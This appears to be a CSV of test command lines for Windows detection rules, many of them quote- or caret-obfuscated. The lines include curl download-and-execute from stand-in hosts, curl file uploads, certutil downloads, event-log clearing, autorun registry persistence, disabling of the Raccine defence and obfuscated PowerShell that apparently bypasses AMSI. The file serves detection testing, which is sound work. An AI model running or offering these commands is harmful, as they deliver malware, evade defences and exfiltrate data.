Folder,CommandLine
win_shadow_copies_access_symlink,cmd /c "m"k"l"i"n"k /D c:\foobar \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\"
win_shadow_copies_access_symlink,"C:\Windows\System32\cmd.exe" /c "mklink /d c:\tmp\vssstore \\?\GLOBALROOT\Device\Harddisk"Volume"Shadow"Copy"1\"
win_shadow_copies_access_symlink,cmd /c "mklink /d c:\tmp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\"
win_shadow_copies_access_symlink,"C:\Windows\System32\cmd.exe" /c "mklink /d c:\tmp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\"
win_shadow_copies_access_symlink,cmd /c "mklink /d c:\tmp\vssstore \\?\GLOBALROOT\Device\Harddisk""VolumeShadowCopy1\"
win_shadow_copies_access_symlink,cmd /c "mklink /D c:\foobar \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\"
win_spn_enum,C:\set_spn.exe -"Q" */*server*
win_spn_enum,"C:\Windows\System32\setspn.exe" /"q" http/somename
win_spn_enum,setspn -q foo/example.com
win_spn_enum,"C:\Windows\System32\setspn.exe" -q http/somename
win_spn_enum,setspn /q foo/example.com
win_spn_enum,C:\set_spn.exe -q */*server*
win_susp_adfind,adfind -subnets -f (o"b"j"e"c"t"C"a"t"e"g"o"r"y=subnet)
win_susp_adfind,C:\Program Files\AdFind.exe -b DC=Contoso;DC=com -f "object"category=person" displayName -sl
win_susp_adfind,adfind -h 172.16.0.2:389 -f objectcategory=organizationalUnit
win_susp_adfind,C:\Program Files\AdFind.exe -b DC=Contoso;DC=com -f "objectcategory=person" displayName -sl
win_susp_adfind,adfind -h 172.16.0.2:389 -f "object"category=organizationalUnit
win_susp_adfind,adfind -subnets -f (objectCategory=subnet)
win_susp_bcdedit,bcdedit.exe /del""etevalue {default} safeboot
win_susp_bcdedit,"C:\Windows\System32\bcdedit.exe" /i""m""p""o""r""t %TEMP%\default.bcd
win_susp_bcdedit,bcdedit /delete {5cb10d44-20ee-11ea-85c6-e6e1f64324aa}
win_susp_bcdedit,"C:\Windows\System32\bcdedit.exe" /import %TEMP%\default.bcd
win_susp_bcdedit,bcdedit /del"ete" {5cb10d44-20ee-11ea-85c6-e6e1f64324aa}
win_susp_bcdedit,bcdedit.exe /deletevalue {default} safeboot
win_susp_bginfo,C:\Users\joe\Downloads\BGInfo\bginfo.exe /"popup" /"nolicprompt" %TEMP%\bginfo.bgi
win_susp_bginfo,"C:\Users\Administrator\BGInfo.exe" "C:\Users\Administrator\bginfo.bgi" -NOLICPROMPT -POPUP
win_susp_bginfo,bginfo.exe /popup /nolicprompt info.bgi
win_susp_bginfo,"C:\Users\Administrator\BGInfo.exe" "C:\Users\Administrator\bginfo.bgi" /NOLICPROMPT /POPUP
win_susp_bginfo,bginfo.exe -popup -nolicprompt info.bgi
win_susp_bginfo,C:\Users\joe\Downloads\BGInfo\bginfo.exe /popup /nolicprompt %TEMP%\bginfo.bgi
win_susp_calc,calc evil1 evil2 evil3
win_susp_calc,"C:\Windows\System32\calc.exe" more evil commandline arguments
win_susp_calc,C:\Windows\System32\calc.exe evilargument
win_susp_calc,C:\calc.exe more evil commandline arguments
win_susp_calc,calc.exe evilargument
win_susp_calc,C:\calc.exe
win_susp_calc,C:\Windows\System32\calc.exe evil1 evil2 evil3
win_susp_cdb,cdb.exe -"o" calc.exe -"cf" %TEMP%\malicious_script
win_susp_cdb,"C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\cdb.exe" /"o" "C:\Windows\System32\ping.exe" /"cf" evilscript
win_susp_cdb,cdb -cf foo -o notepad.exe
win_susp_cdb,"C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\cdb.exe" -o "C:\Windows\System32\ping.exe" -cf evilscript
win_susp_cdb,cdb /cf foo /o notepad.exe
win_susp_cdb,cdb.exe -o calc.exe -cf %TEMP%\malicious_script
win_susp_certutil_command,C:\Windows\System32\certutil.exe -verify""ctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe
win_susp_certutil_command,certutil.exe "-urlcache" -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
win_susp_certutil_command,certutil /decode foo bar
win_susp_certutil_command,certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
win_susp_certutil_command,certutil "/decode" foo bar
win_susp_certutil_command,C:\Windows\System32\certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe
win_susp_certutil_encode,C:\Windows\System32\certutil -encode -f %TEMP%\input output
win_susp_certutil_encode,certutil.exe  -f -encode C:\Users\Administrator\Downloads\a.tmp C:\Users\Administrator\Downloads\b.tmp
win_susp_certutil_encode,certutil.exe -f -encode foo bar
win_susp_certutil_encode,certutil.exe -f -encode C:\Users\Administrator\Downloads\a.tmp C:\Users\Administrator\Downloads\b.tmp
win_susp_certutil_encode,certutil.exe -f "-encode" foo bar
win_susp_certutil_encode,certutil -encode -f %TEMP%\input output
win_susp_cli_escape,powershell -c invoke-webrequest -uri htt"p://www.google.de -outfile foo
win_susp_cli_escape,cmd /c "certutil -verifyctl -f -split h^^^^^^^^^^^^^t^^^^^^^^^^^^6t^^^^^^^p://example.com/virus.exe"
win_susp_cli_escape,powershell -c invoke-webrequest -uri h^t^t^p://www.google.de -outfile foo
win_susp_cli_escape,cmd /c "certutil -verifyctl -f -split h^t^t^p://example.com/virus.exe"
win_susp_cli_escape,powershell -c invoke-webrequest -uri h^t^tp://www.google.de -outfile foo
win_susp_cli_escape,powershell -c invoke-webrequest -uri h"t"t"p://www.google.de -outfile foo
win_susp_codepage_switch,chcp.com 01258
win_susp_codepage_switch,"chcp"   936
win_susp_codepage_switch,chcp 936
win_susp_codepage_switch,chcp   936
win_susp_codepage_switch,C:\Windows\System32\chcp 936
win_susp_codepage_switch,chcp.com 1258
win_susp_copy_lateral_movement,cmd.exe /c copy \\192.168.0.23\^c$\Users\ADMINI~1\AppData\Local\Temp\secret.zip D:\
win_susp_copy_lateral_movement,C:\Windows\System32\cmd.exe /c "copy" \\server123\C$\Users\john\Downloads\Nuclear_Codes.docx C:\
win_susp_copy_lateral_movement,cmd /c copy \\192.168.0.23\admin$\write.exe C:\Users\ADMINI~1\AppData\Local\Temp
win_susp_copy_lateral_movement,C:\Windows\System32\cmd.exe /c copy \\server123\C$\Users\john\Downloads\Nuclear_Codes.docx C:\
win_susp_copy_lateral_movement,cmd /c copy \\192.168.0.23\admi""$\write.exe C:\Users\ADMINI~1\AppData\Local\Temp
win_susp_copy_lateral_movement,cmd.exe /c copy \\192.168.0.23\c$\Users\ADMINI~1\AppData\Local\Temp\secret.zip D:\
win_susp_copy_system32,C:\Windows\System32\cmd.exe /c copy C:\Windows\S""y""s""t""e""m""3""2\certutil.exe C:\Users\john\AppData\Local\Temp\
win_susp_copy_system32,cmd.exe /c xcopy C:\Windows\S""ystem32\certutil.exe C:\
win_susp_copy_system32,cmd /c copy C:\Windows\System32\cmd.exe .
win_susp_copy_system32,cmd.exe /c xcopy C:\Windows\System32\certutil.exe C:\
win_susp_copy_system32,cmd /c "copy C:\Windows\System32\cmd.exe ."
win_susp_copy_system32,C:\Windows\System32\cmd.exe /c copy C:\Windows\System32\certutil.exe C:\Users\john\AppData\Local\Temp\
win_susp_crackmapexec_execution,powershell -noni -nop -w 1 -enc SQBFAFgAIABjAGEAbABjAC4AZQB4AGUA
win_susp_crackmapexec_execution,C:\Windows\System32\powershell.exe "-noni" "-nop" "-w" 1 "-enc" JAB0ACAAPQAgACcAZABpAHIAJwA7AA0ACgAmACAAKAAnAEkAbgB2AG8AawBlACcAKwAnAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAnACkAIAAkAHQA
win_susp_crackmapexec_execution,powershell.exe -exec bypass -noni -nop -w 1 -C "echo foo"
win_susp_crackmapexec_execution,C:\Windows\System32\powershell.exe -noni -nop -w 1 -enc JAB0ACAAPQAgACcAZABpAHIAJwA7AA0ACgAmACAAKAAnAEkAbgB2AG8AawBlACcAKwAnAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAnACkAIAAkAHQA
win_susp_crackmapexec_execution,powershell.exe -w 1 -nop -noni -exec bypass -C "echo foo"
win_susp_crackmapexec_execution,powershell.exe -noni -nop -w 1 -enc SQBFAFgAIABjAGEAbABjAC4AZQB4AGUA
win_susp_crackmapexec_powershell_obfuscation,powershell  -exec bypass -noni -nop -w 1 -C " & ( $SHellid[1]+$sHelLId[13]+'X')(" $( SV  'OFs'  '' ) "+ [sTrING][CHaR[]](91 ;78 ; 101; 116 ; 46 ;83 ; 101 ; 114;118; 105 ; 99; 101;80 ;111 ;105 ; 110; 116;77 ; 97;110;97 ; 103 ; 101 ; 114;93;58 ;58;83;101; 114;118 ; 101;114 ;67 ;101; 114;116; 105 ; 102;105; 99;97;116;101 ;86; 97;108; 105 ; 100 ;97 ;116 ;105 ;111; 110 ;67; 97; 108; 108; 98 ; 97;99 ; 107; 32;61;32;123;36;116 ;114;117 ; 101 ;125;10;116; 114 ;121 ; 123; 10;91; 82;101 ; 102 ;93; 46;65;115 ;115 ;101 ;109 ;98; 108; 121 ;46;71 ; 101; 116;84 ; 121 ;112 ; 101 ;40 ; 39 ; 83;121 ; 115;39 ; 43; 39 ; 116; 101 ; 109;46; 77; 97; 110 ; 39 ; 43 ;39 ;97;103;101 ;109;101;110;116 ;46 ; 65 ;117; 116; 39 ;43;39;111; 109 ; 97;116 ; 105 ;111; 110;46; 65 ;109;39; 43;39; 115;105 ; 85; 116; 39; 43; 39 ;105 ;108 ; 115; 39 ;41 ;46 ; 71 ;101 ; 116;70 ; 105 ;101;108 ; 100; 40 ; 39; 97; 109; 39; 43 ; 39 ;115 ;105 ;73 ; 110 ;105;39 ; 43;39 ;116 ;70 ;97 ; 105 ; 108;101; 100 ;39;44;32 ;39 ;78 ; 111 ; 110 ; 80;39; 43 ;39 ;117 ;98; 108;105;99; 44; 83;116;97;39;43;39;116 ;105; 99; 39; 41;46 ;83 ; 101 ;116 ; 86; 97 ; 108; 117 ;101; 40; 36 ;110;117;108; 108;44 ; 32; 36; 116 ; 114 ;117 ;101;41; 10;125 ; 99;97; 116 ;99; 104;123; 125 ;10;36 ;80 ; 83 ;86; 101; 114 ;115 ;105 ;111; 110 ; 84;97 ; 98; 108;101 )+"$( sET-iTEm 'VaRiable:Ofs'  ' ')" )"
win_susp_crackmapexec_powershell_obfuscation,powershell.exe  -exec bypass -noni -nop -w 1 -C "-jOin( '91}78The exclusive semaphore is owned by another process.%%116%%46>83~101m114X118>105_99~101>80&111>105X110X116~77&97X110Z97~103&101X114>93X58~58X83>101_114~118&101m114_67X101m114Z116m105~102&105m99Z97m116}101Z86X97~108~105%%100%%97}116_105%%111}110%%67m97X108%%108%%98m97%%99>107&32m61&32~123%%36&116~114~117&101~125_10_116m114Z121m123~10_91Z82}101}102m93}46&65~115&115Z101>109m98Z108_121Z46~71>101X116Z84}121_112m101%%40%%39%%83_121&115_39X43}39~116>101X109_46X77Z97Z110}39>43_39Z97~103~101}109>101&110>116}46&65~117_116}39~43~39}111~109>97~116Z105Z111X110X46m65}109X39&43~39_115>105~85m116~39Z43X39~105X108Z115Z39_41&46%%71~101}116~70~105~101X108%%100}40Z39~97&109>39X43>39~115m105X73X110X105>39Z43}39&116_70_97}105}108Z101m100X39&44m32}39&78%%111~110&80&39&43X39X117X98%%108~105~99_44~83_116m97Z39&43>39}116}105%%99%%39>41&46~83&101m116_86~97%%108&117~101}40&36~110~117m108&108Z44_32&36Z116}114&117X101&41Z10m125&99}97}116>99%%104_123}125_10}36m80~83_86>101&114~115X105&111>110X84&97&98}108Z101'.spl""iT( '~_X}%%~mZ>&' )| foReAch{ ( [inT]$_ -aS[chAR]) }) |& ( $psHomE[4] + $PShoME[30]+'X')" 
win_susp_crackmapexec_powershell_obfuscation,powershell.exe  -exec bypass -noni -nop -w 1 -C "('91Y78>101E116;46E83A101s114A118;105;99d101;80E111;105A110H116}77A97d110s97s103}101s114s93>58>58Y83H101s114s118H101Y114Y67Y101A114>116;105E102;105;99H97E116;101Y86A97}108}105H100s97H116;105H111Y110;67H97;108A108Y98E97H99>107Y32;61>32A123;36E116A114;117s101}125Y10A116}114;121s123d10s91A82d101;102Y93>46A65A115}115E101;109Y98H108Y121A46d71>101E116d84A121}112;101}40}39;83;121Y115;39s43}39;116E101H109Y46;77;97s110Y39;43Y39s97A103;101d109d101;110d116A46Y65d117Y116d39E43;39>111E109>97A116;105}111>110}46}65A109}39s43H39A115>105E85;116>39}43s39H105H108d115E39}41>46E71}101s116>70;105H101}108A100>40s39E97A109A39A43>39>115;105>73Y110E105;39>43A39;116A70}97Y105H108;101E100A39;44}32}39}78Y111H110s80;39Y43;39;117>98Y108;105;99>44s83;116d97d39E43>39;116}105H99A39;41s46Y83Y101>116E86Y97;108;117s101Y40d36A110d117d108A108E44s32;36A116Y114;117E101>41>10}125H99Y97H116H99H104s123}125}10Y36;80s83;86Y101H114;115d105}111Y110E84s97s98>108>101'.SPlIT('sY;AdE;}>H') | %% {([INt]$_-As[CHaR])}) -jOIN''| & ( ([stRiNG]$vErBoSEpREFEreNce)[1;3]+'x'-JOin'')"
win_susp_crackmapexec_powershell_obfuscation,powershell.exe  -exec bypass -noni -nop -w 1 -C "-jOin( '91}78The exclusive semaphore is owned by another process.%%116%%46>83~101m114X118>105_99~101>80&111>105X110X116~77&97X110Z97~103&101X114>93X58~58X83>101_114~118&101m114_67X101m114Z116m105~102&105m99Z97m116}101Z86X97~108~105%%100%%97}116_105%%111}110%%67m97X108%%108%%98m97%%99>107&32m61&32~123%%36&116~114~117&101~125_10_116m114Z121m123~10_91Z82}101}102m93}46&65~115&115Z101>109m98Z108_121Z46~71>101X116Z84}121_112m101%%40%%39%%83_121&115_39X43}39~116>101X109_46X77Z97Z110}39>43_39Z97~103~101}109>101&110>116}46&65~117_116}39~43~39}111~109>97~116Z105Z111X110X46m65}109X39&43~39_115>105~85m116~39Z43X39~105X108Z115Z39_41&46%%71~101}116~70~105~101X108%%100}40Z39~97&109>39X43>39~115m105X73X110X105>39Z43}39&116_70_97}105}108Z101m100X39&44m32}39&78%%111~110&80&39&43X39X117X98%%108~105~99_44~83_116m97Z39&43>39}116}105%%99%%39>41&46~83&101m116_86~97%%108&117~101}40&36~110~117m108&108Z44_32&36Z116}114&117X101&41Z10m125&99}97}116>99%%104_123}125_10}36m80~83_86>101&114~115X105&111>110X84&97&98}108Z101'.spliT( '~_X}%%~mZ>&' )| foReAch{ ( [inT]$_ -aS[chAR]) }) |& ( $psHomE[4]+$PShoME[30]+'X')" 
win_susp_crackmapexec_powershell_obfuscation,powershell.exe  -exec bypass -noni -nop -w 1 -C "('91Y78>101E116;46E83A101s114A118;105;99d101;80E111;105A110H116}77A97d110s97s103}101s114s93>58>58Y83H101s114s118H101Y114Y67Y101A114>116;105E102;105;99H97E116;101Y86A97}108}105H100s97H116;105H111Y110;67H97;108A108Y98E97H99>107Y32;61>32A123;36E116A114;117s101}125Y10A116}114;121s123d10s91A82d101;102Y93>46A65A115}115E101;109Y98H108Y121A46d71>101E116d84A121}112;101}40}39;83;121Y115;39s43}39;116E101H109Y46;77;97s110Y39;43Y39s97A103;101d109d101;110d116A46Y65d117Y116d39E43;39>111E109>97A116;105}111>110}46}65A109}39s43H39A115>105E85;116>39}43s39H105H108d115E39}41>46E71}101s116>70;105H101}108A100>40s39E97A109A39A43>39>115;105>73Y110E105;39>43A39;116A70}97Y105H108;101E100A39;44}32}39}78Y111H110s80;39Y43;39;117>98Y108;105;99>44s83;116d97d39E43>39;116}105H99A39;41s46Y83Y101>116E86Y97;108;117s101Y40d36A110d117d108A108E44s32;36A116Y114;117E101>41>10}125H99Y97H116H99H104s123}125}10Y36;80s83;86Y101H114;115d105}111Y110E84s97s98>108>101'.SPlIT('sY;AdE;}>H') | %% {([INt]$_-As[CHaR])}) -jOIN''| & ( ([stRiNG]$vErBoSEpREFEreNce)[1;3] + 'x'-JOin'')"
win_susp_crackmapexec_powershell_obfuscation,powershell.exe  -exec bypass -noni -nop -w 1 -C " & ( $SHellid[1]+$sHelLId[13]+'X')(" $( SV  'OFs'  '' ) "+ [sTrING][CHaR[]](91 ;78 ; 101; 116 ; 46 ;83 ; 101 ; 114;118; 105 ; 99; 101;80 ;111 ;105 ; 110; 116;77 ; 97;110;97 ; 103 ; 101 ; 114;93;58 ;58;83;101; 114;118 ; 101;114 ;67 ;101; 114;116; 105 ; 102;105; 99;97;116;101 ;86; 97;108; 105 ; 100 ;97 ;116 ;105 ;111; 110 ;67; 97; 108; 108; 98 ; 97;99 ; 107; 32;61;32;123;36;116 ;114;117 ; 101 ;125;10;116; 114 ;121 ; 123; 10;91; 82;101 ; 102 ;93; 46;65;115 ;115 ;101 ;109 ;98; 108; 121 ;46;71 ; 101; 116;84 ; 121 ;112 ; 101 ;40 ; 39 ; 83;121 ; 115;39 ; 43; 39 ; 116; 101 ; 109;46; 77; 97; 110 ; 39 ; 43 ;39 ;97;103;101 ;109;101;110;116 ;46 ; 65 ;117; 116; 39 ;43;39;111; 109 ; 97;116 ; 105 ;111; 110;46; 65 ;109;39; 43;39; 115;105 ; 85; 116; 39; 43; 39 ;105 ;108 ; 115; 39 ;41 ;46 ; 71 ;101 ; 116;70 ; 105 ;101;108 ; 100; 40 ; 39; 97; 109; 39; 43 ; 39 ;115 ;105 ;73 ; 110 ;105;39 ; 43;39 ;116 ;70 ;97 ; 105 ; 108;101; 100 ;39;44;32 ;39 ;78 ; 111 ; 110 ; 80;39; 43 ;39 ;117 ;98; 108;105;99; 44; 83;116;97;39;43;39;116 ;105; 99; 39; 41;46 ;83 ; 101 ;116 ; 86; 97 ; 108; 117 ;101; 40; 36 ;110;117;108; 108;44 ; 32; 36; 116 ; 114 ;117 ;101;41; 10;125 ; 99;97; 116 ;99; 104;123; 125 ;10;36 ;80 ; 83 ;86; 101; 114 ;115 ;105 ;111; 110 ; 84;97 ; 98; 108;101 )+"$( sET-iTEm 'VaRiable:Ofs'  ' ')" )"
win_susp_csc_folder,C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /noconfig /fullpaths @"C:\Windows\T""emp\-dcx32-8.cmdline"
win_susp_csc_folder,csc /noconfig /fullpaths @"C:\Users\john\App"Data\Local\Temp\foo"
win_susp_csc_folder,C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /noconfig /fullpaths @"C:\Users\admin\AppData\Local\Temp\-dcx32-8.cmdline"
win_susp_csc_folder,csc /noconfig /fullpaths @"C:\Users\john\AppData\Local\Temp\foo"
win_susp_csc_folder,C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /noconfig /fullpaths @"C:\Users\admin\App""Data\Local\Temp\-dcx32-8.cmdline"
win_susp_csc_folder,C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /noconfig /fullpaths @"C:\Windows\Temp\-dcx32-8.cmdline"
win_susp_curl_download,C:\Users\joe\AppData\Local\Temp\curl.exe -Os http://ashadysite.com/32498349863469.exe & start 32498349863469.exe
win_susp_curl_download,C:\curl "-O" http://172.16.0.123/very_funny.scr & start very_funny.scr
win_susp_curl_download,curl -O http://192.168.191.1/shell191.exe & start shell191.exe
win_susp_curl_download,C:\curl -O http://172.16.0.123/very_funny.scr & start very_funny.scr
win_susp_curl_download,curl --remote-name http://192.168.191.1/shell191.exe & start shell191.exe
win_susp_curl_download,C:\Users\joe\AppData\Local\Temp\curl.exe -O http://ashadysite.com/32498349863469.exe & start 32498349863469.exe
win_susp_curl_fileupload,curl.exe -""F file=C:\\upload\\this\\file.txt http://remote/server"
win_susp_curl_fileupload,curl "-F" myfile.txt 127.0.0.1:88
win_susp_curl_fileupload,curl -F file=upload_file.txt http://127.0.0.1/upload
win_susp_curl_fileupload,curl -F myfile.txt 127.0.0.1:88
win_susp_curl_fileupload,curl -"F" file=upload_file.txt http://127.0.0.1/upload
win_susp_curl_fileupload,curl.exe -F file=C:\upload\this\file.txt http://remote/server
win_susp_curl_start_combo,cu""rl.exe -O http://remote.server/malicious.exe & start malicious.exe
win_susp_curl_start_combo,"cu"rl.exe -O http://this.is.fine/nothing_to_see.exe & start nothing_to_see.exe
win_susp_curl_start_combo,curl -O http://192.168.191.1/shell191.exe & start shell191.exe
win_susp_curl_start_combo,curl.exe -O http://this.is.fine/nothing_to_see.exe & start nothing_to_see.exe
win_susp_curl_start_combo,c"ur"l -O http://192.168.191.1/shell191.exe & start shell191.exe
win_susp_curl_start_combo,curl.exe -O http://remote.server/malicious.exe & start malicious.exe
win_susp_desktopimgdownldr,set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://download.bad/mal.exe /eventName:desktopimgdownldr && echo "print .jpg to avoid detection"
win_susp_desktopimgdownldr,r"e"g.exe     de""le"te" HKLM\Software\Microsoft\Windows\CurrentVersion\Person""aliz"atio"nCSP
win_susp_desktopimgdownldr,set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://www.bundesgesundheitsministerium.de/fileadmin/Dateien/3_Downloads/C/Coronavirus/Verordnungen/CoronaImpfV_BAnz_AT_08.02.2021_V1.pdf /eventName:desktopimgdownldr
win_susp_desktopimgdownldr,reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\PersonalizationCSP
win_susp_desktopimgdownldr,set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lock""sc"reen"url:https://www.bundesgesundheitsministerium.de/fileadmin/Dateien/3_Downloads/C/Coronavirus/Verordnungen/CoronaImpfV_BAnz_AT_08.02.2021_V1.pdf /eventName:desktopimgdownldr
win_susp_desktopimgdownldr,set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://download.bad/mal.exe /eventName:desktopimgdownldr
win_susp_direct_asep_reg_keys_modification,reg a""dd HKLM\software\Microsoft\Windows\CurrentVersion\Ru"nOn"ce
win_susp_direct_asep_reg_keys_modification,reg add HKLM\software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
win_susp_direct_asep_reg_keys_modification,reg ad""d \so"ftware\Micros"oft\Windows\CurrentVersion\Ru"nOn"ce"E"x
win_susp_direct_asep_reg_keys_modification,reg add HKLM\sof"tware\Micro"soft\Windows NT\CurrentVersion\Win"logon\User"init
win_susp_direct_asep_reg_keys_modification,reg "a"dd HKLM\software\Microsoft\Win"dows\CurrentVersion\Ru"nServices
win_susp_direct_asep_reg_keys_modification,reg add HKLM\system\CurrentControlSet\Control\SafeB"oot\Alter"nateShell
win_susp_direct_asep_reg_keys_modification,reg add HKLM\software\Microsoft\Windows\CurrentVersion\Run
win_susp_direct_asep_reg_keys_modification,reg add \software\Microsoft\Windows\CurrentVersion\RunOnceEx
win_susp_direct_asep_reg_keys_modification,reg a"dd" HKLM\so"ftw"are\Mi"cro"soft\Win"dow"s\Curr"ent"Version\Run
win_susp_direct_asep_reg_keys_modification,reg add HKLM\software\Microsoft\Windows NT\Cur"rentVersion\Wi"nlogon\Shell
win_susp_direct_asep_reg_keys_modification,reg add HKLM\software\Microsoft\Windows\CurrentVersion\RunServices
win_susp_direct_asep_reg_keys_modification,reg a"d"d HKLM\software\Microsoft\Windows NT\Curren"tVersion\Win"dows
win_susp_direct_asep_reg_keys_modification,reg add HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
win_susp_direct_asep_reg_keys_modification,reg add HKLM\softw"are\Micros"oft\Windows\CurrentVersion\Ru"nServicesOn"ce
win_susp_direct_asep_reg_keys_modification,reg add HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
win_susp_direct_asep_reg_keys_modification,reg add HKLM\software\Microsoft\Windows\CurrentVersion\RunOnce
win_susp_direct_asep_reg_keys_modification,reg ad""d HKLM\software\Microsoft\Windows\Current"Vers"ion\Explorer\User Shell Folders
win_susp_direct_asep_reg_keys_modification,reg add HKLM\software\Microsoft\Windows NT\CurrentVersion\Windows
win_susp_direct_asep_reg_keys_modification,reg add HKLM\software\Microsoft\Windows\CurrentVersion\RunServicesOnce
win_susp_direct_asep_reg_keys_modification,reg add HKLM\system\CurrentControlSet\Control\SafeBoot\AlternateShell
win_susp_disable_ie_features,powershell /c New-ItemProperty -Path HKLM\Software\Policies\Microsoft\Internet Explorer\Main!DEPOff  -n"am"e D"E"POff -va"l"ue "1" 
win_susp_disable_ie_features,powershell /c New-ItemProperty -Path HKCU\Software\Microsoft\Internet Explorer\Main\DisableFirstRunCustomize  -name   DisableFirstRunCustomize    -value    2 
win_susp_disable_ie_features,powershell /c New-ItemProperty -Path HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IEharden -name IEHarden -value 0 
win_susp_disable_ie_features,powershell /c New-ItemProperty -Path HKCU\Software\Microsoft\Internet Explorer\Main\DisableFirstRunCustomize  -name DisableFirstRunCustomize -value 2 
win_susp_disable_ie_features,powershell /c New-ItemProperty -Path HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IEharden -n"am"e I"EH"arden -v"al"ue "0" 
win_susp_disable_ie_features,powershell /c New-ItemProperty -Path HKLM\Software\Policies\Microsoft\Internet Explorer\Main!DEPOff  -name DEPOff -value 1 
win_susp_disable_raccine,r""e"g" de"le"te HKLM\Path\Rac"c"ine Tray
win_susp_disable_raccine,sch""t"ask"s -de""le"te" -tn Raccine Rules Updater
win_susp_disable_raccine,taskkill /IM RaccineSettings.exe
win_susp_disable_raccine,schtasks /delete -tn Raccine Rules Updater
win_susp_disable_raccine,t""a"skk"ill.exe -"IM"     R"acci"neSet""tings.exe
win_susp_disable_raccine,reg.exe delete HKLM\Path\Raccine Tray
win_susp_eventlog_clear,wevtutil.exe "cl" System
win_susp_eventlog_clear,wevtutil.exe se"t-l"og Application /ms:1048575
win_susp_eventlog_clear,powershell /C L"imi"t-Ev"ent"Log System -MaximumSize 64KB
win_susp_eventlog_clear,powershell /C Cl"ear"-EventLog System
win_susp_eventlog_clear,wevtutil.exe clear-log System
win_susp_eventlog_clear,wevtutil.exe set-log Application /ms:1048575
win_susp_eventlog_clear,wevtutil.exe cl"ear-l"og System
win_susp_eventlog_clear,wmic nteventlog where filename="application" "cleareventlog"
win_susp_eventlog_clear,powershell /C Clear-EventLog System
win_susp_eventlog_clear,powershell /C Limit-EventLog System -MaximumSize 64KB
win_susp_eventlog_clear,powershell /C "Re"mo"ve-Ev"ent""Log System
win_susp_eventlog_clear,wmic nteventlog where filename="application" cleareventlog 
win_susp_eventlog_clear,wevtutil.exe cl System
win_susp_eventlog_clear,powershell /C Remove-EventLog System
win_susp_explorer_break_proctree,C:\Windows\expl"ore"r."exe" /r"oo"t; "C:\Windows\System32\notepad.exe"
win_susp_explorer_break_proctree,ex""plorer -"roo"t; "C:\Windows\System32\cmd.exe"
win_susp_explorer_break_proctree,explorer.exe /root; "C:\Windows\System32\cmd.exe"
win_susp_explorer_break_proctree,explorer.exe /root; "C:\Windows\System32\cmd.exe"
win_susp_explorer_break_proctree,explorer root; "C:\Windows\System32\cmd.exe"
win_susp_explorer_break_proctree,C:\Windows\explorer.exe /root; "C:\Windows\System32\notepad.exe"
win_susp_findstr_lnk,findstr.exe maliciousfilecontent *"."lnk
win_susp_findstr_lnk,C:\Windows\System32\findstr.exe findme "*."lnk
win_susp_findstr_lnk,findstr searchstring *.lnk
win_susp_findstr_lnk,C:\Windows\System32\findstr.exe findme *.lnk
win_susp_findstr_lnk,findstr searchstring *."lnk"
win_susp_findstr_lnk,findstr.exe maliciousfilecontent *.lnk
